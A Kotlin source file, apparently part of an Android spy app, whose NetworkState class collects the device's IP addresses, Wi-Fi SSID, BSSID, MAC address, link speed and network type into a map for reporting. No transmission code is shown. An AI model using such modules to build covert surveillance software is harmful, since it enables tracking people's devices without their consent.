package com.komnacki.androidspyapp.device.network

import android.content.Context
import com.komnacki.androidspyapp.Message
import github.nisrulz.easydeviceinfo.base.EasyNetworkMod
import github.nisrulz.easydeviceinfo.base.NetworkType


class NetworkState(override var context: Context) :
    Message {
    init {
        getNetworkState(
            context
        )
    }

    companion object {
        private val info : MutableMap<String, Any> = mutableMapOf()

        fun getNetworkState(context: Context) {
            val easyNetworkState = EasyNetworkMod(context)
            info["IPV4_ADDRESS"] = easyNetworkState.iPv4Address
            info["IPV6_ADDRESS"] = easyNetworkState.iPv6Address
            info["WIFI_AVAILABLE"] = easyNetworkState.isNetworkAvailable
            info["WIFI_ENABLED"] = easyNetworkState.isWifiEnabled
            info["WIFI_SSID"] = easyNetworkState.wifiSSID
            info["WIFI_BSSID"] = easyNetworkState.wifiBSSID
            info["WIFI_SPEAD"] = easyNetworkState.wifiLinkSpeed
            info["WIFI_MAC"] = easyNetworkState.wifiMAC
            info["NETWORK_TYPE"] = when(easyNetworkState.networkType) {
                NetworkType.CELLULAR_2G -> "2G"
                NetworkType.CELLULAR_3G -> "3G"
                NetworkType.CELLULAR_4G -> "4G"
                NetworkType.CELLULAR_UNIDENTIFIED_GEN -> "Undefined"
                NetworkType.CELLULAR_UNKNOWN -> "Unknown"
                NetworkType.WIFI_WIFIMAX -> "WIFI Max"
                else -> "Unknown"
            }
        }
    }

    override fun getData(): Map<String, Any> {
        return info
    }
}